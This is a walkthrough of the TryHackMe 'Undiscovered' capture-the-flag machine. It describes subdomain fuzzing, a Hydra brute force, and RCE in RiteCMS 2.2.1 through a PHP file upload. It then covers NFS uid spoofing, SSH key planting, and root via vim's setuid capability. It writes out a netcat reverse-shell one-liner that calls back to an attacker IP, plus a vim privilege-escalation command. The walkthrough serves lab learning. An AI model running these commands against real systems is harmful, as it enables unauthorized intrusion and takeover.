# Undiscovered TryHackMe Writeup
### Level: `Medium` | OS: `Linux`

![logo](1.jpeg)

## Scanning
We run **nmap** on all ports, with scripts and versions.

![](2.png)

## Enumeration
We access the web service, find a website with what looks like a *"hint"*.

![](3.png)

We launch the **wfuzz** tool to list possible subdomains enabled on *vhost*.

We see that there is *only one with different number of lines*.

![](4.png)

We access the new web resource and find **RiteCMS** version *2.2.1* deployed.

![](5.png)

We check again **wfuzz**, we see that it has identified another subdomain.

![](6.png)

We list another subdomain with the same CMS, unlike the previous one, in this one we have visibility to the authentication form.

![](7.png)

We brute force the authentication form with **Hydra**, we get the password in plain text.

![](8.png)

## Exploitation

We searched for exploits for this version of the CMS, we found several and some scripts that automates, but I preferred to do it "by hand".

[RiteCMS 2.2.1 - Authenticated Remote Code Execution
](https://www.exploit-db.com/exploits/48636)

We create a malicious file called *"m3.php"*.

![](9.png)

Enter the credentials obtained and upload the file *m3.php*.

![](10.png)

We access the file and check that we can execute remote code.

![](11.png)

#### Reverse shell

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.30.149 443 >/tmp/f
```
We encode the payload and execute it from burp.

![](12.png)

#### Remote access to the machine:

![](13.png)

Once inside, we launch the dirsearch tool and we see that we could mount and write in the folder of the user "*william*".

![](14.png)

We tried to mount it, but we do not have permission to view its contents.

![](16.png)

But it is easy to take advantage of this vulnerability, just create a local user with the same *uid (3003)* and now you can access your folder and read the *user.txt flag*.

![](17.png)

We checked the folder and found two interesting files "*admin.sh*" and "*script*". I try to delete the file and it is possible to replace it, thinking that maybe they can be combined or that there is some crontab running as another user, I try to add a line to get a reverse shell (but without success :().

![](18.png)

We check with **strings** the content of the "*script*" binary and we see that it executes a "**cat**" inside the user's home folder.

![](19.png)

Taking advantage of the fact that we have write permissions in the nfs, we insert our public key in the "*authorized_keys*" file of the user "*william*" and we access by **SSH**.

![](20.png)

We make some tests with the file and we see that we can indeed impersonate the user "*leonard*" to be able to read any file in his folder, so we try to read his private key and we see that we have been lucky.

![](21.png)

We access by **SSH** and we see that we have access as "*leonard*".

![](22.png)

## Privilege Escalation
We read the file "*.viminfo*", we see a series of commands that already sounds us of the use of privilege escalation by means of **vim**, this already makes us suspect which is the way to the privilege escalation.

![](23.png)

As we can't run sudo because we don't know the user's password, we see if we can access the **vim** binary through its capabilities, we see that we have "*cap_setuid+ep*", so we can abuse it and become root.

![](24.png)

#### Command execute
```bash
/usr/bin/vim.basic  -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
We run the command, become root and read the flag from root.txt

![](25.png)

---
## About

David Utón is Penetration Tester and security auditor for web and mobiles applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks.

#### Contacted on:

<img src='https://m3n0sd0n4ld.github.io/imgs/linkedin.png' width='40' align='center'> [David-Uton](https://www.linkedin.com/in/david-uton/)
<img src='https://m3n0sd0n4ld.github.io/imgs/twitter.png' width='43' align='center'> [@David_Uton](https://twitter.com/David_Uton)
